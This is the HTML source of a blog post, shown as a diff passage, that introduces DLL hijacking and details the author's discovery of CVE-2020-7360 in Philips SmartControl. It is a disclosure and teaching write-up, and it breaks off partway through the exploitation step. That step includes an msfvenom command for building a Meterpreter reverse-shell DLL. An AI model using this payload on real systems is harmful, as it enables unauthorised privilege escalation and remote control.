@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Philips SmartControl DLL hijacking (CVE-2020-7360)</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=d44c73ced9" />
+
+    <meta name="description" content="This article combines a write-up of a DLL hijacking flaw affecting Philips SmartControl (CVE-2020-7360) with a general introduction to DLL hijacking." />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://blog.vonahi.io/when-the-path-to-system-is-wide-open/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://blog.vonahi.io/when-the-path-to-system-is-wide-open/amp/" />
+    
+    <meta property="og:site_name" content="Vonahi Security&#x27;s Blog" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Philips SmartControl DLL hijacking (CVE-2020-7360)" />
+    <meta property="og:description" content="Earlier this year our threat researcher found a DLL hijacking flaw affecting Philips SmartControl (CVE-2020-7360). Our latest blog post combines a write-up of this vulnerability with a general introduction to DLL hijacking for infosec students." />
+    <meta property="og:url" content="https://blog.vonahi.io/when-the-path-to-system-is-wide-open/" />
+    <meta property="og:image" content="https://blog.vonahi.io/content/images/2020/08/philips-3.jpg" />
+    <meta property="article:published_time" content="2020-08-06T12:04:00.000Z" />
+    <meta property="article:modified_time" content="2020-08-07T11:43:41.000Z" />
+    <meta property="article:tag" content="research" />
+    <meta property="article:tag" content="penetration testing" />
+    <meta property="article:tag" content="post-exploitation" />
+    <meta property="article:tag" content="privilege escalation" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/vonahisec" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Philips SmartControl DLL hijacking (CVE-2020-7360)" />
+    <meta name="twitter:description" content="Earlier this year our threat researcher found a DLL hijacking flaw affecting Philips SmartControl (CVE-2020-7360). Our latest blog post combines a write-up of this vulnerability with a general introduction to DLL hijacking for infosec students." />
+    <meta name="twitter:url" content="https://blog.vonahi.io/when-the-path-to-system-is-wide-open/" />
+    <meta name="twitter:image" content="https://blog.vonahi.io/content/images/2020/08/philips-2.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Erik Wynter" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="research, penetration testing, post-exploitation, privilege escalation" />
+    <meta name="twitter:site" content="@vonahisec" />
+    <meta name="twitter:creator" content="@wyntererik" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="628" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Vonahi Security&#x27;s Blog",
+        "url": "https://blog.vonahi.io/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.vonahi.io/content/images/2019/02/VonahiSec_VERT_RGB.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Erik Wynter",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://blog.vonahi.io/content/images/2020/08/cat_laptop.jpg",
+            "width": 2000,
+            "height": 1333
+        },
+        "url": "https://blog.vonahi.io/author/wynter/",
+        "sameAs": [
+            "https://twitter.com/wyntererik"
+        ]
+    },
+    "headline": "Philips SmartControl DLL hijacking (CVE-2020-7360)",
+    "url": "https://blog.vonahi.io/when-the-path-to-system-is-wide-open/",
+    "datePublished": "2020-08-06T12:04:00.000Z",
+    "dateModified": "2020-08-07T11:43:41.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.vonahi.io/content/images/2020/08/philips-vulnerability-1.jpg",
+        "width": 2000,
+        "height": 1153
+    },
+    "keywords": "research, penetration testing, post-exploitation, privilege escalation",
+    "description": "Earlier this year our threat researcher found a DLL hijacking flaw affecting Philips SmartControl (CVE-2020-7360). Our latest blog post combines a write-up of this vulnerability with a general introduction to DLL hijacking for infosec students.",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://blog.vonahi.io/"
+    }
+}
+    </script>
+
+    <script defer src="https://unpkg.com/@tryghost/portal@~0.16.0/umd/portal.min.js" data-ghost="https://blog.vonahi.io/"></script><style> .gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <meta name="generator" content="Ghost 3.42" />
+    <link rel="alternate" type="application/rss+xml" title="Vonahi Security&#x27;s Blog" href="https://blog.vonahi.io/rss/" />
+    <!-- Fix first paragraph font size -->
+<style type="text/css">
+.post-template .post-content > p:first-child {
+    font-size: 1em;
+}
+</style>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111637682-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-111637682-3');
+</script>
+
+<script type="text/javascript" src="//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script><script type="text/javascript">window.dojoRequire(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us16.list-manage.com","uuid":"c6322029200b81393894c8a4f","lid":"ad91ba8be2","uniqueMethods":true}) })</script>
+
+</head>
+<body class="post-template tag-research tag-penetration-testing tag-post-exploitation tag-privilege-escalation">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+                <a class="site-nav-logo" href="https://blog.vonahi.io"><img src="/content/images/2019/02/VonahiSec_VERT_RGB.png" alt="Vonahi Security&#x27;s Blog" /></a>
+            <ul class="nav">
+    <li class="nav-vonahi-security-home"><a href="https://www.vonahi.io/">Vonahi Security Home</a></li>
+    <li class="nav-blog"><a href="https://blog.vonahi.io/">Blog</a></li>
+    <li class="nav-weekly-threat-reports"><a href="https://blog.vonahi.io/weekly-threat-reports/">Weekly Threat Reports</a></li>
+</ul>
+
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+                <a class="social-link social-link-fb" href="https://www.facebook.com/vonahisec" title="Facebook" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+</a>
+                <a class="social-link social-link-tw" href="https://twitter.com/vonahisec" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            <a class="social-link social-link-tw" href="https://www.linkedin.com/company/vonahisec" title="LinkedIn" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>
+            <a class="social-link social-link-tw" href="https://www.github.com/vonahisec" title="GitHub" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg></a>
+        </div>
+            <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://blog.vonahi.io/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+    </div>
+</nav>
+    </div>
+</header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-research tag-penetration-testing tag-post-exploitation tag-privilege-escalation ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="2020-08-06">6 August 2020</time>
+                        <span class="date-divider">/</span> <a href="/tag/research/">research</a>
+                </section>
+                <h1 class="post-full-title">When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)</h1>
+            </header>
+
+            <figure class="post-full-image">
+                <img
+                    srcset="/content/images/size/w300/2020/08/philips-vulnerability-1.jpg 300w,
+                            /content/images/size/w600/2020/08/philips-vulnerability-1.jpg 600w,
+                            /content/images/size/w1000/2020/08/philips-vulnerability-1.jpg 1000w,
+                            /content/images/size/w2000/2020/08/philips-vulnerability-1.jpg 2000w"
+                    sizes="(max-width: 800px) 400px,
+                            (max-width: 1170px) 700px,
+                            1400px"
+                    src="/content/images/size/w2000/2020/08/philips-vulnerability-1.jpg"
+                    alt="When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)"
+                />
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p><em>Remember that high school teacher who was never more than one chapter ahead of their students? Well that is me, in this blog. </em>¯\_(ツ)_/¯</p><h2 id="introduction">Introduction</h2><p>Say what you will about Microsoft Windows, it can provide a great playground for beginning hackers. A good example of this is the Dynamic-Link Library (DLL) search order, which is a core element of the Windows architecture that has been frequently abused by security researchers and threat actors alike. I am personally very thankful for this functionality, because it allowed me to find my first real vulnerability earlier this year, namely a DLL hijacking flaw affecting Philips SmartControl computer monitor settings software (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7360">CVE-2020-7360</a>). The aim of this article is to combine a write-up of this vulnerability with a general introduction to DLL hijacking for those interested to learn more about this attack.</p><p>TL; DR:</p><ul><li>If you are interested to learn about DLL hijacking in general, keep reading.</li><li>If you just want to read the CVE analysis, check it out <a href="#philips-smartcontrol-dll-hijacking-cve-2020-7360-analysis">below</a>.</li></ul><h2 id="dll-hijacking-a-brief-introduction"><br>DLL hijacking: a brief introduction</h2><h3 id="what-are-dlls">What are DLLs?</h3><p>Before we delve into DLL hijacking, let’s first clarify what DLLs are. Microsoft <a href="https://support.microsoft.com/en-us/help/815065/what-is-a-dll">defines</a> a DLL as:</p><blockquote>a library that contains code and data that can be used by more than one program at the same time.</blockquote><p>DLL files can contain code, data and/or resources that applications and indeed the Windows operating itself can make use of. DLLs are very similar to EXE files, the main difference being that they cannot be directly executed. Instead, DLLs can only be executed after being called by an EXE.</p><h3 id="what-about-the-dll-search-order">What about the DLL Search Order?</h3><p>The DLL search order determines how Windows will search for DLL files at load time for applications/services that do not specify a full path to the required file, nor use a manifest to specify the libraries they need. Starting with Windows XP SP2, the <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">default DLL search order</a> on Windows systems is something like this:</p><!--kg-card-begin: markdown--><ol>
+<li>The directory from which the application loaded.</li>
+<li>The system directories. On modern 64-bit systems these are <code>C:\Windows\SysWOW64</code> (64-bit programs and files) and <code>C:\Windows\System32</code> (32-bit programs and files). SysWOW64 is logically absent on 32-bit systems, where <code>C:\Windows\System32</code> coexists with <code>C:\Windows\System</code> (16-bit programs and files).</li>
+<li>The Windows directory (<code>C:\Windows</code>)</li>
+<li>The current directory.</li>
+<li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+<!--kg-card-end: markdown--><h3 id="what-exactly-is-path">What exactly is PATH?</h3><!--kg-card-begin: markdown--><p>PATH is an environment variable in Windows as well as Unix-like operating systems including Linux and MacOS. Basically, PATH is a special kind of variable that specifies a set of directories where executable programs are located (source). To demonstrate the use of this, let’s image you want to run an application named <code>1337h4x.exe</code> from the command line (<code>cmd.exe</code>). Normally this would require you to enter the full path to the executable, e.g. <code>C:\pwn4g3\1337h4x.exe</code>. But this is a little annoying, especially if you need to run this app on a regular basis. However, if you add <code>C:\pwn4g3\</code> to your PATH variable, you can run the app from CMD by entering <code>1337h4x</code>. This works because when Command Prompt receives a command it does not recognize, it consults PATH to see if any of the directories specified there contain an executable file that matches the input command (common filename extensions for Windows executable files include EXE, COM, BAT and CMD). As mentioned above, PATH can also be used by applications to search for files they need to run.</p>
+<!--kg-card-end: markdown--><h3 id="dll-search-order-example">DLL Search Order example</h3><!--kg-card-begin: markdown--><p>To clarify this further, let’s discuss an example based on the following assumptions:<br>
+<code>1337h4x.exe</code> requires the <code>mr_robot.dll</code> library, which is located at <code>C:\mr_robot.dll</code>.<br>
+You are running a 64-bit version of Windows (like a normal person)<br>
+You launch the <code>1337h4x.exe</code> from a shortcut that has the <code>start in</code> value set to <code>C:\</code> (this is defined in the shortcut’s properties). This last part makes little sense, but helps to clarify the difference between search order locations 1 and 4.<br>
+The person who wrote <code>1337h4x.exe</code> failed to specify a full path to <code>mr_robot.dll</code> and doesn’t know how manifests work (in other words, let’s imagine they are me).<br>
+The moment you click on the shortcut, <code>1337h4x.exe</code> begins whining that it needs <code>mr_robot.dll</code> but doesn’t know where it is. Windows immediately comes to the rescue, and starts scouring the operating system for this library, following the default DLL search order. The somewhat oversimplified result of this search could be as follows:</p>
+<ol>
+<li><code>C:\pwn4g3\mr_robot.dll</code> – no luck</li>
+<li><code>C:\Windows\SysWOW64\mr_robot.dll</code> – nope</li>
+<li><code>C:\Windows\mr_robot.dll</code> – not here either</li>
+<li><code>C:\mr_robot.dll</code> – found it, let’s load this broken code!</li>
+</ol>
+<p>That’s great! But what if mr_robot.dll isn’t stored in C:\ either? In that case, the search may continue something like this:</p>
+<ol start="5">
+<li>5.1 <code>C:\example_dir1\mr_robot.dll</code><br>
+5.2 <code>C:\example_dir2\mr_robot.dll</code><br>
+5.3 <code>C:\example_dir3\mr_robot.dll</code><br>
+5.4 <code>C:\mr_robot\mr_robot.dll</code> – found it, let’s load this broken code!</li>
+</ol>
+<!--kg-card-end: markdown--><p>So far so good. However, if an application doesn’t properly take into account the DLL search order and its security implications, the process described above may render the application vulnerable to, you guessed it, DLL hijacking.</p><h3 id="what-is-dll-hijacking">What is DLL hijacking?</h3><p>DLL hijacking is an attack in which an actor executes arbitrary code on the target system by taking advantage of the DLL search order. More specifically, the attacker gets a vulnerable application to load and execute a malicious DLL file by writing it to a location on the target system where the app will look for an identically named file at load time. This evidently requires the attacker to already have sufficient permissions on the target machine to write the malicious library to disk. While DLL hijacking can be used for persistence and defense evasion, the most significant potential impact is privilege escalation. Privilege escalation is possible when the vulnerable app is running with elevated privileges, yet tries to load resources from directories that are writable by an attacker with limited privileges. Those vulnerable resources are referred to as “<a href="https://attack.mitre.org/techniques/T1574/001/">uncontrolled search path elements</a>.”</p><h3 id="dll-hijacking-example">DLL hijacking example</h3><p></p><!--kg-card-begin: markdown--><p>If we take our example of <code>1337h4x.exe</code> and assume that <code>mr_robot.dll</code> isn’t stored in <code>C:\</code>, we can identify at least three possible attack vectors that may allow an attacker with limited privileges on the target system to achieve privileges escalation via DLL hijacking:</p>
+<p>1. – The directory from which the application loaded (<code>C:\pwn4g3\</code>)<br>
+4. – The current directory (<code>C:\</code>)<br>
+5. –  The three example directories in PATH</p>
+<p>On a typical Windows system, low-privileged users cannot write files to <code>C:\Windows\SysWOW64</code> (location 2) and <code>C:\Windows</code> (location 3). However, depending on the folder permissions set for each directory, locations 1, 4 and 5 may all represent uncontrolled search path elements. Let’s assume that this is the case in our scenario, and let’s also assume that <code>1337h4x.exe</code> needs administrator privileges to run. This makes it possible for an attacker with limited privileges to escalate their privileges as follows:</p>
+<ol>
+<li>The attacker creates a malicious <code>mr_robot.dll</code> file that contains a reverse shell. This means that when the file is executed, it will open up a connection to a system controlled by the attacker.</li>
+<li>The attacker opens up a listener on their system to receive incoming connections from the malicious <code>mr_robot.dll</code>.</li>
+<li>The attacker writes the <code>mr_robot.dll</code> payload file to <code>C:\pwn4g3\</code>, <code>C:\</code> or one of the three example directories in PATH.</li>
+<li>The attacker waits for a user with elevated privileges to run <code>1337h4x.exe</code>. Once this happens, the application will load the <code>mr_robot.dll</code> payload, and the attacker will receive a connection (a shell) from the target system on their listener. This shell will enable the attacker to execute commands on the target system with the administrator privileges the shell inherited from <code>1337h4x.exe</code>.</li>
+</ol>
+<!--kg-card-end: markdown--><h3 id="scenarios-without-user-interaction">Scenarios without user interaction</h3><!--kg-card-begin: markdown--><p>In the above scenario, the attack requires user interaction, because the attacker doesn’t have sufficient privileges to run <code>1337h4x.exe</code> themselves. This is how the Philips SmartControl vulnerability works. However, user interaction may not always be required for DLL hijacking. For instance, if <code>1337h4x.exe</code> is (insecurely) configured as a service that can be started by regular users, the attacker could trigger the <code>mr_robot.dll</code> payload by simply (re)starting the <code>1337h4x service</code> from the Windows <code>Services</code> app. A second, more likely scenario is that <code>1337h4x.exe</code> is configured as a service that cannot be started by regular users, but will start automatically at bootup. In that case, the attacker would need sufficient privileges to restart the target machine, which is something regular users normally have.</p>
+<!--kg-card-end: markdown--><h3 id="getting-ready-for-a-real-world-example">Getting ready for a real world example</h3><p>So far we have assumed that the vulnerable DLL file is at least present on the target system. However, this doesn’t actually have to be the case. In fact, the vulnerability I found in SmartControl stemmed precisely from the program trying to call various DLL files that didn’t exist. The next section provides  an analysis of this vulnerability and shows the methods and tools you can use to look for DLL hijacking vulnerabilities yourself.</p><h2 id="philips-smartcontrol-dll-hijacking-cve-2020-7360-analysis">Philips SmartControl DLL Hijacking (CVE-2020-7360) analysis</h2><h3 id="cve-details">CVE details</h3><ul><li>Title: "Philips SmartControl DLL Hijacking"</li><li>Description: "An Uncontrolled Search Path Element (CWE-427) vulnerability in SmartControl version 4.3.15 and other versions released before April 15, 2020 may allow an authenticated user to escalate privileges by placing a specially crafted DLL file in the search path."</li><li>Severity: high</li><li>Proposed CVSS score: 7.4 (National Vulnerability Database (NVD) will calculate the CVSS score independently after publication).</li><li>Proposed CVSS vector: CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:L</li><li>CVE URL: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7360">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7360</a> (not yet available)</li><li>NVD URL: <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7360">https://nvd.nist.gov/vuln/detail/CVE-2020-7360</a> (not yet available)</li></ul><h3 id="background">Background</h3><p>I first came across SmartControl when I searched the web for a driver for my Philips monitor. According to the description, SmartControl would let me configure a ton of settings for my monitor, which sounded great, so I installed and ran it. To my surprise, I was prompted to enter my administrator password. This piqued my interest. A few months earlier, I had done some research on DLL hijacking. From this I learned firstly that it is not an uncommon issue in applications and services that do not require special privileges, and secondly that those findings aren’t very interesting because they can’t be exploited for privilege escalation. But with SmartControl this could be a wholly different story, so I decided to investigate. Below I will describe my investigation and findings as a series of steps that you can follow to research DLL hijacking vulnerabilities yourself.</p><h3 id="step-1-installing-the-required-tools">Step 1: Installing the required tools</h3><!--kg-card-begin: markdown--><p>To identify the SmartControl DLL hijacking vulnerability, I used Process Explorer and Process Monitor from the Windows Sysinternals suite, which is a collection of handy Windows tools. You can download Sysinternals here	and then simply extract Process Explorer (<code>procexp64.exe</code>) and Process Monitor (<code>procmon64.exe</code>) from the archive.<br>
+For exploitation, I used msfvenom and msfconsole, two tools that are part of the Metasploit penetration testing framework. Metasploit comes pre-installed on popular operating systems designed for ethical hacking such as Kali Linux, Parrot OS, BlackArch Linux and BackBox. Metasploit is also available on GitHub. Most users run Metasploit on Linux, but it can also be installed on Windows and OSX. Documentation is available here. In my case, I ran Metasploit on a Kali Linux virtual machine that I was running from the Windows 10 machine where I installed SmartControl.</p>
+<!--kg-card-end: markdown--><h3 id="step-2-using-process-explorer-to-check-if-smartcontrol-is-running-with-elevated-privileges">Step 2: Using Process Explorer to check if SmartControl is running with elevated privileges</h3><!--kg-card-begin: markdown--><p>Launch Process Explorer as administrator by right-clicking on the executable and selecting <code>Run as administrator</code><br>
+Make sure the <code>User Name</code> column is enabled. If not, go to <code>View &gt; Select Columns &gt; Process Image</code> and tick the <code>User Name</code> box. You should now be looking at something like Image 1 below:</p>
+<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.vonahi.io/content/images/2020/08/procexp-1.png" class="kg-image" alt srcset="https://blog.vonahi.io/content/images/size/w600/2020/08/procexp-1.png 600w, https://blog.vonahi.io/content/images/2020/08/procexp-1.png 863w" sizes="(min-width: 720px) 720px"><figcaption><i>Image 1: Process Explorer with the User Name column enabled</i></figcaption></figure><!--kg-card-begin: markdown--><ul>
+<li>Select the process you want to investigate (eg smartcontrol.exe) in the <code>Process</code> column, and check the value in the <code>User Name</code> column. <code>NT AUTHORITY\SYSTEM</code> means the process is running with maximum privileges.</li>
+<li>If the process is running as a user, you can check the permissions by double-clicking on the process, going to the <code>Security</code> tab and checking the box at the bottom of the window. If you see more than something like five basic privileges listed, the process is likely running with elevated privileges. Image 2 shows a comparison between the permissions of cmd.exe running as a regular user (left) and <code>smartcontrol.exe</code>, which always runs with administrator privileges (right).</li>
+</ul>
+<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.vonahi.io/content/images/2020/08/procexp_privileges.png" class="kg-image" alt srcset="https://blog.vonahi.io/content/images/size/w600/2020/08/procexp_privileges.png 600w, https://blog.vonahi.io/content/images/2020/08/procexp_privileges.png 780w" sizes="(min-width: 720px) 720px"><figcaption><i>Image 2: Left: cmd.exe privileges (regular user). Right: smartcontrol.exe privileges (administrator)</i></figcaption></figure><h3 id="step-3-using-process-monitor-to-look-for-uncontrolled-search-path-elements">Step 3: Using Process Monitor to look for uncontrolled search path elements</h3><!--kg-card-begin: markdown--><ul>
+<li>Launch Process Monitor as administrator by right-clicking on the executable and selecting <code>Run as administrator</code>.</li>
+<li>Select appropriate filters for the target process. When Process Monitor launches, the <code>Filter</code> window should open up in addition to the main window. You can also manually open it via <code>Filter &gt; Filter</code>. In addition to the default filters, you should add at least the following filters:
+<ul>
+<li><code>Process Name – is – &lt;the_target_process_name.exe&gt; – Include</code></li>
+<li><code>Operation – is – CreateFile – Include</code></li>
+<li><code>Operation – is – Load Image – Include</code></li>
+<li><code>Result – is – NAME NOT FOUND – Include</code></li>
+</ul>
+</li>
+<li>In order to ignore locations that are not writable by regular users on a typical Windows system, you can also add the following filters:
+<ul>
+<li><code>Path – begins with – C:\Program Files – Exclude</code></li>
+<li><code>Path – begins with – C:\Windows – Exclude</code></li>
+</ul>
+</li>
+<li>To make sure the results will only contain DLL files, you could add the following filter:
+<ul>
+<li><code>Path – ends with – .dll – Include</code></li>
+</ul>
+</li>
+<li>Make sure Process Monitor is capturing (<code>Ctrl+E</code>). If you need to clear the display, use <code>Ctrl+X</code>.</li>
+<li>Finally, (re)start the target application/service.</li>
+</ul>
+<p>The two images below show the filters I set when analyzing <code>smartcontrol.exe</code> and the resulting output.</p>
+<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.vonahi.io/content/images/2020/08/procmon_filters.png" class="kg-image" alt srcset="https://blog.vonahi.io/content/images/size/w600/2020/08/procmon_filters.png 600w, https://blog.vonahi.io/content/images/2020/08/procmon_filters.png 644w"><figcaption><i>Image 3: Process Monitor filters to identify uncontrolled search path elements</i></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.vonahi.io/content/images/2020/08/procmon_search_path_elements.png" class="kg-image" alt srcset="https://blog.vonahi.io/content/images/size/w600/2020/08/procmon_search_path_elements.png 600w, https://blog.vonahi.io/content/images/size/w1000/2020/08/procmon_search_path_elements.png 1000w, https://blog.vonahi.io/content/images/2020/08/procmon_search_path_elements.png 1018w" sizes="(min-width: 720px) 720px"><figcaption><i>Image 4: Process Monitor output showing all uncontrolled search path elements in smartcontrol.exe on my test system.</i></figcaption></figure><h3 id="step-4-analyzing-the-results">Step 4: Analyzing the results</h3><!--kg-card-begin: markdown--><p>Looking at the results, we can see that SmartControl tries to call the following four DLL files from three locations that are writable by a regular user: <code>atiddc.dll</code>, <code>atiadlxx.dll</code>, <code>atiadlxy.dll</code> and <code>MtxApi.dll</code>.<br>
+The significance of the three locations, i.e. <code>C:\nasmx\bin</code> and Python27 directories located within the current user’s AppData directories, is that all of them are part of PATH on the test system.</p>
+<!--kg-card-end: markdown--><p>It should be noted that none of these directories are part of PATH by default on Windows systems. In fact, the directories aren’t even present on a fresh Windows installation. But while PATH may not be dangerous by default, <strong>it is bad practice for applications to rely on PATH to load resources</strong>. PATH can’t be trusted for two reasons:</p><ol><li>Windows applications such as Python and other interpreters may add directories to PATH that are writable by regular users.</li><li>Users can manually add world-writable directories to PATH, without realizing that this could render certain programs vulnerable to uncontrolled search path elements.</li></ol><p>I should also add that the four DLL files SmartControl is trying to find in PATH are simply not present on Windows 10 by default. And since the app runs fine without them, they don’t even seem to be necessary, at least not on Windows 10 systems.</p><h3 id="step-5-exploiting-uncontrolled-search-path-elements">Step 5: Exploiting uncontrolled search path elements</h3><!--kg-card-begin: markdown--><ul>
+<li>
+<p>Use msfvenom create a malicious DLL file, using the following syntax:<br>
+<code>msfvenom -p \&lt;payload\&gt; LHOST=\&lt;IP\&gt; LPORT=\&lt;port\&gt; -f dll -o \&lt;file.dll\&gt;</code></p>
+<ul>
+<li><code>-p</code> – The payload should be a Metasploit-compatible payload. Depending on the process, you may want to try both x86 (32-bit) and x64 (64-bit) payloads:
+<ul>
+<li>x86 (32-bit) example payload: <code>windows/meterpreter/reverse_tcp</code></li>
+<li>x64 (64-bit) example payload: <code>windows/x64/meterpreter/reverse_tcp</code></li>
+</ul>
+</li>
+<li><code>LHOST</code> – Set this to the IP of the system where you will start a listener to receive the connection (see the next step).</li>
+<li><code>LPORT</code> – This is the port on which the listener will be opened. You are basically free to choose any port that isn’t already being used by your system.</li>
+<li><code>-f</code> – This flag is used to set the file-type of the payload, so the value should be ‘dll’.</li>
